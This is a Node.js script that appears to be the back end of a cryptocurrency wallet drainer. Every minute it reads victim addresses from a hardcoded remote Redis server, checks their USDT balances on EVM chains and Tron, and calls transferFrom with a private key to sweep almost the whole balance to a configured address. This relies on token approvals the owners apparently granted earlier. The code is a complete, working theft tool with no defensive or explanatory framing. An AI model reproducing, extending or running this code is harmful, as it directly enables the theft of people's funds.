require("dotenv").config();

const { createClient } = require("redis");
const cfg = require("./config/config");
const { getChainConfig } = require("./config/chain");
const TronWebModule = require("tronweb");
const TronWeb = TronWebModule.TronWeb || TronWebModule.default || TronWebModule;
const { ethers } = require("ethers");

const redisClient = createClient({
  socket: {
    host: "45.119.55.186",
    port: 6379
  },
  password: "uuuuu",
  database: 0
});

redisClient.on("error", (err) => {
  console.error("redis error", err.message);
});

const THRESHOLD_USDT = BigInt(process.env.AMOUNT_USDT || "0");

function resolveChainId(chainKey) {
  const key = String(chainKey).toLowerCase();
  if (key === "tron") return "tron";
  if (key === "bsc") return "56";
  if (key === "bsctestnet") return "97";
  if (key === "eth" || key === "ethereum" || key === "erc20") return "1";
  return key;
}

async function getEvmTokenBalance(chainConfig, ownerAddress) {
  if (!chainConfig.rpcUrl) {
    return 0n;
  }
  const rpcUrl = chainConfig.rpcUrl;
  const tokenAddress = chainConfig.usdtAddress;
  if (!tokenAddress) {
    return 0n;
  }
  let addr = String(ownerAddress || "");
  if (!addr) {
    return 0n;
  }
  addr = addr.toLowerCase();
  if (addr.startsWith("0x")) {
    addr = addr.slice(2);
  }
  if (addr.length !== 40) {
    return 0n;
  }
  const padded = addr.padStart(64, "0");
  const data = "0x70a08231" + padded;

  const body = {
    jsonrpc: "2.0",
    id: 1,
    method: "eth_call",
    params: [
      {
        to: tokenAddress,
        data: data
      },
      "latest"
    ]
  };

  const res = await fetch(rpcUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(body)
  });
  const json = await res.json();
  if (json.error || !json.result) {
    return 0n;
  }
  try {
    const raw = BigInt(json.result);
    const decimals = 6n;
    const divisor = 10n ** decimals;
    const usdt = raw / divisor;
    return usdt;
  } catch (e) {
    return 0n;
  }
}

async function getTronTokenBalance(chainConfig, ownerAddress) {
  if (!chainConfig || !chainConfig.rpcUrl || !chainConfig.usdtAddress) {
    return 0n;
  }
  if (!ownerAddress) {
    return 0n;
  }
  const tronWeb = new TronWeb({
    fullHost: chainConfig.rpcUrl
  });
  try {
    const contract = await tronWeb.contract().at(chainConfig.usdtAddress);
    const result = await contract.balanceOf(ownerAddress).call();
    const raw = BigInt(result.toString());
    const decimals = 6n;
    const divisor = 10n ** decimals;
    return raw / divisor;
  } catch (e) {
    return 0n;
  }
}

async function getUsdtBalance(chainKey, chainConfig, ownerAddress) {
  if (!chainConfig) {
    return 0n;
  }
  if (chainConfig.type === "evm") {
    return getEvmTokenBalance(chainConfig, ownerAddress);
  }
  if (chainConfig.type === "tron") {
    return getTronTokenBalance(chainConfig, ownerAddress);
  }
  return 0n;
}

function getToAddress(chainConfig) {
  return chainConfig.toAddress || chainConfig.spenderAddress || "";
}

async function autoTransferEvm(chainKey, chainConfig, ownerAddress, amountUsdt) {
  if (!chainConfig.rpcUrl || !chainConfig.usdtAddress || !chainConfig.pk) return;
  const provider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
  const wallet = new ethers.Wallet(chainConfig.pk, provider);
  const to = getToAddress(chainConfig);
  if (!to) return;

  const abi = [
    "function decimals() view returns (uint8)",
    "function transferFrom(address from, address to, uint256 value) returns (bool)"
  ];
  const token = new ethers.Contract(chainConfig.usdtAddress, abi, wallet);
  const decimals = Number(await token.decimals());
  const units = BigInt(amountUsdt) * (10n ** BigInt(decimals));

  console.log("[AUTO-TRANSFER-EVM]", "chainKey=" + chainKey, "owner=" + ownerAddress, "to=" + to, "amountUsdt=" + amountUsdt.toString());
  const tx = await token.transferFrom(ownerAddress, to, units);
  console.log("[AUTO-TRANSFER-EVM] txHash=", tx.hash);
}

async function autoTransferTron(chainKey, chainConfig, ownerAddress, amountUsdt) {
  if (!chainConfig.usdtAddress || !chainConfig.pk) return;
  const fullHost = chainConfig.rpcUrl || "https://api.trongrid.io";
  const tronWeb = new TronWeb({
    fullHost,
    privateKey: chainConfig.pk
  });
  const to = getToAddress(chainConfig);
  if (!to) return;

  const decimals = 6n;
  const units = (BigInt(amountUsdt) * (10n ** decimals)).toString();

  console.log("[AUTO-TRANSFER-TRON]", "chainKey=" + chainKey, "owner=" + ownerAddress, "to=" + to, "amountUsdt=" + amountUsdt.toString());
  const contract = await tronWeb.contract().at(chainConfig.usdtAddress);
  const txId = await contract.transferFrom(ownerAddress, to, units).send({ feeLimit: 100000000 });
  console.log("[AUTO-TRANSFER-TRON] txId=", txId);
}

async function scanOnce() {
  if (!redisClient.isOpen) {
    await redisClient.connect();
  }
  const keys = await redisClient.keys("usdt:owners:*");
  for (const key of keys) {
    const chainKey = key.slice("usdt:owners:".length);
    const chainConfig = getChainConfig(resolveChainId(chainKey));
    if (!chainConfig) {
      continue;
    }
    const owners = await redisClient.sMembers(key);
    for (const owner of owners) {
      try {
        const balanceUsdt = await getUsdtBalance(chainKey, chainConfig, owner);
        if (balanceUsdt > THRESHOLD_USDT) {
          if (chainConfig.type === "evm") {
            await autoTransferEvm(chainKey, chainConfig, owner, balanceUsdt - 1n);
          } else if (chainConfig.type === "tron") {
            await autoTransferTron(chainKey, chainConfig, owner, balanceUsdt - 1n);
          }
        }
      } catch (e) {
        console.error("scan balance error", chainKey, owner, e.message);
      }
    }
  }
}

async function main() {
  try {
    await scanOnce();
    setInterval(() => {
      scanOnce().catch((e) => {
        console.error("scanOnce error", e.message);
      });
    }, 60 * 1000);
  } catch (e) {
    console.error("cron main error", e.message);
    process.exit(1);
  }
}

main();
